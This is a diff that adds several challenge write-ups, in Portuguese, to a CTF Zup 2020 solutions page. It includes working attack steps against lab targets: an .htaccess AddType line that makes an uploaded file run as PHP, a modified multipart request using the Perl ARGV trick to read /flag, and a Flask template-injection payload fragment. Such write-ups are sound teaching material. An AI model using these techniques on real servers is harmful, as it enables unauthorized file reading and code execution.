@@ -38,10 +38,10 @@ dos desafios do CTF Zup 2020, ou pelo menos aqueles que eu consegui resolver :ro
     - [Easy two](#easy-two)
     - [Fucking](#fucking)
     - [I hate flask](#i-hate-flask)
-    - LFI
-    - Look Closer
-    - Nice site
-    - Perl
+    - [LFI](#lfi)
+    - [Look Closer](#look-closer)
+    - [Nice site](#nice-site)
+    - [Perl](#perl)
     - Potatoe is good
     - Server status (SSRF)
     - Unsafe Entity (XXE)
@@ -368,6 +368,71 @@ http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__(
 I love Flask & ZUP-CTF{Eu_4ind4_4M0_FLaSK_SST1}
 ``` 
 
+### LFI ###
+Este desafio nos apresenta uma página simples html, porém com um comentário bem interessante ao inspecionar o html
+```html
+<!-- file657354.php?abrir= -->
+``` 
+Acesso então essa página file657354.php e passo como parâmetro para a query 'abrir' a própria página php, e portanto conseguimos ver o seu código fonte.
+```html
+<!-- file657354.php?abrir=file657354.php -->
+``` 
+Neste código fonte descobrimos que através do parâmetro abrir conseguimos ler arquivos do servidor que são printados de volta, porém não é possível ler nada que não esteja no próprio diretório pois há um if bloqueando o acesso a pastas em diretórios acima do dir atual "../". Mas descobrimos também que existem outros dois parâmetros, que nos permite criar um arquivo no servidor, definindo sua extensão e conteúdo. Esse trecho de código, porém, nos bloqueia de criar arquivos com extensão .php e/ou .htm.
+
+Não há restrições, porém, para criarmos um arquivo .htaccess, arquivo esse que permite o servidor reconhecer outras extensões como sendo código php válido e executar esse código antes de servir a página ao cliente. Crio então um arquivo similar ao abaixo, fazendo uso do file657354.php com os parâmetros nomeArquivo e conteudoArquivo
+
+.htaccess
+```html
+AddType application/x-httpd-php .leolana
+``` 
+Agora o servidor irá reconhecer arquivos de extensão .leolana como php válido. Basta então executar novamente um post no arquivo file657354.php passando agora um código php que faça um scandir('') e nos retorne o conteúdo do diretório. E dessa forma, navegando na estrutura de pastas do servidor é possível encontrar a flag em um txt, a um nível acima, bastando então alterar constantemente o conteúdo do arquivo .leolana criado a cada nova descoberta e chegar finalmente na nossa flag.
+
+
+### Look Closer ###
+
+Esse desafio nos retorna uma página html estática bem simples com uma imagem e aparentemente mais nada. Mas ao olhar com cautela ou mesmo inspecionando a página é possível ver que a flag simplesmente estava com a cor branca camuflada no fundo da página também branco.
+
+### Nice Site ###
+
+Esse desafio nos apresenta uma página html com um javascript que tem como única função travar o nosso acesso/browser. Porém logo no primeiro request eu já havia realizado via postman, de modo que o javascript não foi executado e portanto não tive nenhum obstáculo para encontrar a flag.
+
+### Perl ###
+
+Esse desafio nos apresenta uma página bem simples com três links, um hello world, um formulário de dois inputs text e uma página de upload de arquivos.
+A nossa página de interesse é justamente a página de upload de arquivos. Tudo que é submetido ao servidor essa página printa de volta no corpo da resposta.
+Estudando um pouco sobre perl vejo o funcionamento da função que provavelmente é usada no codigo, já que sei que a página está trabalhando com leitura de arquivos. Descubro uma brecha que faz uso do [ARGV](#http://kentfredric.github.io/blog/2016/01/01/re-the-perl-jam-2-argv-is-evil/), e daí basicamente os próximos passos foram, fiz uso da ferramenta
+[Burp Suite](#burp-suite-community-edition), do recurso de interceptador.
+Abrindo a ferramenta acessamos o browser normalmente, porém habilitamos a opção 'interceptador' dentro da ferramenta. Faço então o request normalmente, enviado na url o nome do arquivo que eu suspeito ser o alvo/desejo abrir
+
+```html
+POST http://challenges.ctfd.io:30167/cgi-bin/file.pl?/flag
+``` 
+E anexo um arquivo qualquer.
+Ao submeter a requisição o Burp logo notifica, como se tivesse fazendo um debug na requisição que dependesse do usuário 'soltar o breakpoint', exibindo todos os dados do request. O trecho que nos interessa é o
+
+```html
+---------------------------------------------------2313300055123995
+Content-Disposition: form-data; name="file"; filename="exemplo.txt"
+
+Meutesteexploitperl
+---------------------------------------------------2313300055123995
+``` 
+
+Altero para que fique conforme abaixo
+
+```html
+---------------------------------------------------2313300055123995
+Content-Disposition: form-data; name="file"
+
+ARGV
+---------------------------------------------------2313300055123995
+Content-Disposition: form-data; name="file"; filename="exemplo.txt"
+
+Meutesteexploitperl
+---------------------------------------------------2313300055123995
+``` 
+
+E e mando o Burp deixar seguir o request agora alterado. Dessa forma o servidor me retorna, em vez do conteudo do arquivo exemplo.txt que eu submeti o conteúdo do arquivo flag, contido no próprio servidor remoto : ZUP-CTF{P3rl_6_iz_!!12} <3
 
 # Ferramentas #
 
@@ -412,3 +477,5 @@ Ferramenta muito robusta para pentest disponível [em](#https://github-productio
 Ferramenta para realizar requests Restful/automações de chamadas de API's disponível [em](https://dl.pstmn.io/download/latest/win64)
 ### JS Fuck Decoder ###
 Ferramenta para desofuscar um javascript 'fuck' disponível online [em](https://enkhee-osiris.github.io/Decoder-JSFuck/){:target="_blank"}
+### Burp Suite Community Edition ###
+Ferramenta para busca de vulnerabilidades web disponível [em](https://portswigger.net/burp/releases/community/latest)
